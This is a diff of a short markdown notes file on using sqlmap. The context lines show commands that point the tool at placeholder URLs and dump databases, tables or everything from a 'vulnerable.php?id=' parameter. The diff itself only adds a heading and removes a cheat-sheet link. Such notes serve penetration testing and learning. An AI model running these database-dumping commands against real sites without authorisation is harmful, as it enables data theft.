@@ -1,5 +1,7 @@
 # Sqlmap-Notes
 
+SQL-Code-Structure
+
 Target the http://target.server.com URL using the “-u” flag:
 sqlmap -u 'http://target.server.com'
 
@@ -84,6 +86,3 @@ extra: sqlmap http://target.com/vulnerable.php?id=123 -p id -D $db_name -T $tabl
 extra: sqlmap http://target.com/vulnerable.php?id=123 -p id -D $db_name --dump-all
 
 
-
-code-structure
-https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/?adlt=strict
